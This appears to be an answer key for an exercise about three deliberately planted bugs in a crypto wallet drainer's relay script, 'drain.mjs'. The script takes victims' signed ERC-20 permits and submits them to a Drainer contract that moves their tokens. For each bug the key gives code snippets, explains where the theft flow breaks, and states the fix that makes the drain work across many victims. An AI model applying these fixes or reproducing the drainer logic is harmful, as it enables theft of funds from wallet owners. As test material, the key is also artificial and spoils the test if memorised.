# ANSWER KEY — 3 Bugs in `scripts/drain.mjs`

## Bug 1 — CORS: `POST` missing from allowed methods

**File/line:** `scripts/drain.mjs` → the CORS middleware (`app.use`).

```js
res.setHeader("Access-Control-Allow-Methods", "GET,OPTIONS");   // ← BUG
// should be: "GET,POST,OPTIONS"
```

**What it does:** The relay advertises it only allows `GET` and `OPTIONS` cross-origin.

**Why the attack fails:** The page (port 3000) posts JSON to the relay (port 3456).
JSON POSTs trigger a browser CORS *preflight* (`OPTIONS`). The preflight response says
`POST` is not allowed, so the browser **blocks the request**. The signature never
reaches the relay — `/api/permit` is never hit, nothing is stored, nothing can be drained.

**Where the flow dies:** Step 1 (page → relay). The relay's own logs show nothing.

**Fix:** `res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");`

---

## Bug 2 — `/api/drain` ignores the requested `index`

**File/line:** `scripts/drain.mjs` → `app.post("/api/drain", ...)`.

```js
const { index } = req.body;
const permit = permits[0];   // ← BUG
// should be: const permit = permits[index];
```

**What it does:** `index` is read from the request but then unused — it always grabs
`permits[0]` (the first victim to ever sign).

**Why the attack fails:** After the first victim is drained, `permits[0].executed` is
`true`, so every subsequent `POST /api/drain` returns `"Already executed"`. Even with
hundreds of signed victims, the attacker can only ever drain **one** of them. (Note:
the drain result block also uses `permits[index]` to mark executed — a mix of `[0]`
and `[index]` that doesn't match the actual victim drained.)

**Where the flow dies:** Step 2 (relay picks the victim).

**Fix:** `const permit = permits[index];`

---

## Bug 3 — `drainer.drain()` argument order swapped

**File/line:** `scripts/drain.mjs` → the `drainer.drain(...)` call inside `/api/drain`.

```js
const tx = await drainer.drain(
  permit.owner,          // ← BUG (should be token address)
  permit.tokenAddress,   // ← BUG (should be victim address)
  permit.value,
  permit.deadline,
  permit.v,
  permit.r,
  permit.s
);
```

Contract ABI in the same file:

```js
"function drain(address token, address victim, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
```

**What it does:** `token` receives the **victim's wallet address**, and `victim`
receives the **token contract address**. Both are `address` types, so ethers happily
encodes the call and the tx is broadcast — it looks normal in the explorer.

**Why the attack fails:** The Drainer contract runs `IERC20(token).permit(...)` where
`token` is now an EOA (no code). Every call to it reverts:
`"function call to a non-contract account"`. The entire batch of permit+transferFrom
reverts, so **no tokens ever move**.

**Where the flow dies:** Step 3 (on-chain). The relay logs `Tx submitted` but
`tx.wait()` throws and returns a 500.

**Fix:** Pass `permit.tokenAddress` as the first argument and `permit.owner` as the second.

---

## Quick reference — where each bug kills the attack

| Bug | Step killed | Symptom |
|-----|-------------|---------|
| CORS missing POST | 1. page → relay | Browser blocks POST; relay logs nothing |
| `permits[0]` vs `permits[index]` | 2. relay picks victim | Only 1 victim ever drained; "Already executed" after |
| swapped args in `drain()` | 3. on-chain | Tx broadcasts then reverts; nothing moves |